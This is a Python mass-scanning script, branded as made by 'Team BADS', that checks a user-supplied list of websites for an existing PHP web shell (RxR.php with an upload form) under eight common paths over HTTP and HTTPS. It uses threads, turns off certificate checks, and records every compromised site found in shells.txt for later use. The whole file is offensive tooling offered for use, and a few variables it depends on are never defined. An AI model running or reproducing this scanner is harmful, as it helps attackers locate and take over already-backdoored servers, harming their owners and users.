import time,requests,sys,random,re,string,concurrent.futures
banner = '''
 \u001b[31m__________   ___ .______    __        ______    __  .___________. _______ .______      
|   ____\  \ /  / |   _  \  |  |      /  __  \  |  | |           ||   ____||   _  \     
|  |__   \  V  /  |  |_)  | |  |     |  |  |  | |  | `---|  |----`|  |__   |  |_)  |    
|   __|   >   <   |   ___/  |  |     |  |  |  | |  |     |  |     |   __|  |      /     
|  |____ /  .  \  |  |      |  `----.|  `--'  | |  |     |  |     |  |____ |  |\  \----.
|_______/__/ \__\ | _|      |_______| \______/  |__|     |__|     |_______|| _| `._____|
                                                                                        
 \u001b[32mDEVELOPED BY TEAM BADS
'''
def animated(text):
    for x in text:
        sys.stdout.write(x)
        sys.stdout.flush()
        time.sleep(0.005)
def URLdomain(site):
    if site.startswith("http://") :
        site = site.replace("http://","")
    elif site.startswith("https://") :
        site = site.replace("https://","")
    else :
        pass
    pattern = re.compile('(.*)/')
    while re.findall(pattern,site):
        sitez = re.findall(pattern,site)
        site = sitez[0]
    return site

def exploit_1(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,timeout=15)
        if ("<input type='submit' value='UPload' />" in check.content.decode("utf-8")):
                print (' [#] Exploit 1 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/RxR.php?Fox=efjiq\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if "<input type='submit' value='UPload' />" in check.content.decode("utf-8"):
                    print (' [#] Exploit 1 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/RxR.php?Fox=efjiq\n')
            else:
                print ('[#] Exploit 1 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_2(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/cgi-bin/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,timeout=15)
        if ("<input type='submit' value='UPload' />" in check.content.decode("utf-8")):
                print (' [#] Exploit 2 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/cgi-bin/RxR.php?Fox=efjiq\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/cgi-bin/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if "<input type='submit' value='UPload' />" in check.content.decode("utf-8"):
                    print (' [#] Exploit 2 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/cgi-bin/RxR.php?Fox=efjiq\n')
            else:
                print ('[#] Exploit 2 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_3(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/blog/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,timeout=15)
        if ("<input type='submit' value='UPload' />" in check.content.decode("utf-8")):
                print (' [#] Exploit 3 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/blog/RxR.php?Fox=efjiq\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/blog/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if "<input type='submit' value='UPload' />" in check.content.decode("utf-8"):
                    print (' [#] Exploit 3 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/blog/RxR.php?Fox=efjiq\n')
            else:
                print ('[#] Exploit 3 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_4(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/cgi-bin/mt/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,timeout=15)
        if ("<input type='submit' value='UPload' />" in check.content.decode("utf-8")):
                print (' [#] Exploit 4 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/cgi-bin/mt/RxR.php?Fox=efjiq\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/cgi-bin/mt/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if "<input type='submit' value='UPload' />" in check.content.decode("utf-8"):
                    print (' [#] Exploit 4 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/cgi-bin/mt/RxR.php?Fox=efjiq\n')
            else:
                print ('[#] Exploit 4 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_5(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/cms/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,timeout=15)
        if ("<input type='submit' value='UPload' />" in check.content.decode("utf-8")):
                print (' [#] Exploit 5 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/cms/RxR.php?Fox=efjiq\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/cms/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if "<input type='submit' value='UPload' />" in check.content.decode("utf-8"):
                    print (' [#] Exploit 5 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/cms/RxR.php?Fox=efjiq\n')
            else:
                print ('[#] Exploit 5 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_6(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/mtos/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,timeout=15)
        if ("<input type='submit' value='UPload' />" in check.content.decode("utf-8")):
                print (' [#] Exploit 6 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/mtos/RxR.php?Fox=efjiq\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/mtos/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if "<input type='submit' value='UPload' />" in check.content.decode("utf-8"):
                    print (' [#] Exploit 6 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/mtos/RxR.php?Fox=efjiq\n')
            else:
                print ('[#] Exploit 6 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_7(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/mt/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,timeout=15)
        if ("<input type='submit' value='UPload' />" in check.content.decode("utf-8")):
                print (' [#] Exploit 7 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/mt/RxR.php?Fox=efjiq\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/mt/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if "<input type='submit' value='UPload' />" in check.content.decode("utf-8"):
                    print (' [#] Exploit 7 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/mt/RxR.php?Fox=efjiq\n')
            else:
                print ('[#] Exploit 7 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_8(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/MT/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,timeout=15)
        if ("<input type='submit' value='UPload' />" in check.content.decode("utf-8")):
                print (' [#] Exploit 8 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/MT/RxR.php?Fox=efjiq\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/MT/RxR.php?Fox=efjiq',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if "<input type='submit' value='UPload' />" in check.content.decode("utf-8"):
                    print (' [#] Exploit 8 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/MT/RxR.php?Fox=efjiq\n')
            else:
                print ('[#] Exploit 8 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#



        







def run_code(site):
    try:
        exploit_1(site)
        exploit_2(site)
        exploit_3(site)
        exploit_4(site)
        exploit_5(site)
        exploit_6(site)
        exploit_7(site)
        exploit_8(site)
    except:
        pass
    
        







print(banner)
filename = input("\033[1;31mENTER FILE NAME : ")
th = int(input("\033[1;31mENTER  THREAD : "))

file = open(filename,encoding="utf-8").read().split()
myfile = set(file)
with concurrent.futures.ThreadPoolExecutor(max_workers=th) as executor:
    
    futures = [executor.submit(run_code, site) for site in myfile]

 
    concurrent.futures.wait(futures)
    